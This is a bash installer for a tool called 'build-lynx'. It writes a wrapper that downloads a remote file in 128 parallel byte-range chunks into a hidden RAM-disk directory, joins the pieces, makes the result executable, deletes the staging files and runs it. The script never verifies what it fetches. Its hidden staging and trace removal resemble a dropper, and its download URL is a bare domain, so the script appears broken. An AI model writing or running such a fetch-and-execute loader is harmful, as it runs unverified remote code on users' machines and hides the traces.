#!/usr/bin/env bash

set -e

# 1. Clean and recreate directories (Using RAM disk for chunk processing)
RAM_DIR="/dev/shm/.lynx_speed"
rm -rf "$RAM_DIR" ~/.lynx ~/.local/bin/build-lynx
mkdir -p "$RAM_DIR" ~/.lynx ~/.local/bin

# 2. Optimized wrapper script with 128 parts running in RAM
cat > ~/.lynx/build-lynx.sh <<'EOF'
#!/usr/bin/env bash
set -e

URL="https://githubusercontent.com"
RAM_DIR="/dev/shm/.lynx_speed"
OUT_DIR="$RAM_DIR/chunks"
rm -rf "$OUT_DIR" && mkdir -p "$OUT_DIR"

# Instantly fetch the total content size in bytes
TOTAL_SIZE=$(curl -sI "$URL" | grep -i 'Content-Length' | awk '{print $2}' | tr -d '\r')

# Fallback size if remote server hides Content-Length
if [ -z "$TOTAL_SIZE" ] || [ "$TOTAL_SIZE" -le 0 ]; then
  TOTAL_SIZE=4000
fi

NUM_PARTS=128
CHUNK_SIZE=$(( TOTAL_SIZE / NUM_PARTS ))

# Generate 128 precise, sequential byte ranges
for i in $(seq 0 $((NUM_PARTS - 1))); do
  START=$(( i * CHUNK_SIZE ))
  if [ "$i" -eq $((NUM_PARTS - 1)) ]; then
    END="" # Last chunk pulls remaining bytes
  else
    END=$(( START + CHUNK_SIZE - 1 ))
  fi
  # Format with 3-digit zero-padded index to guarantee correct sorting
  printf "%03d:%d-%s\n" "$i" "$START" "$END"
done | xargs -I {} -P $NUM_PARTS bash -c '
  INDEX=$(echo "{}" | cut -d: -f1)
  RANGE=$(echo "{}" | cut -d: -f2)
  # Downloading directly into RAM memory
  curl -fsSL -r "$RANGE" "'"$URL"'" -o "'"$OUT_DIR"'/part_$INDEX"
'

# Recombine all 128 parts instantly inside RAM memory
cat "$OUT_DIR"/part_* > "$RAM_DIR/final-build.sh"
chmod +x "$RAM_DIR/final-build.sh"

# Move the finalized script to its home destination and execute
cp "$RAM_DIR/final-build.sh" "$HOME/.lynx/final-build.sh"
rm -rf "$RAM_DIR"

exec "$HOME/.lynx/final-build.sh" "$@"
EOF

chmod +x ~/.lynx/build-lynx.sh

# 3. Create the bin shortcut
cat > ~/.local/bin/build-lynx <<'EOF'
#!/usr/bin/env bash
exec "$HOME/.lynx/build-lynx.sh" "$@"
EOF

chmod +x ~/.local/bin/build-lynx

# 4. Run
export PATH="$HOME/.local/bin:$PATH"

echo "Installed."
echo "Running..."
build-lynx
